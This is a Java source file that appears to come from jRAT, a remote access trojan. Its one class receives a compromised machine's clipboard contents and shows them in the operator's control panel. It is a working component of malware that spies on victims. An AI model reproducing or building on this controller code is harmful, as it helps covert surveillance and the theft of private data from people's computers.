package jrat.controller.packets.incoming;

import jrat.controller.Slave;
import jrat.controller.ui.frames.FrameControlPanel;
import jrat.controller.ui.panels.PanelControlClipboard;


public class Packet41Clipboard implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String content = slave.readLine();
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);

		if (frame != null) {
			PanelControlClipboard panel = (PanelControlClipboard) frame.panels.get("clipboard");
			panel.getPane().setText(content);
		}
	}

}
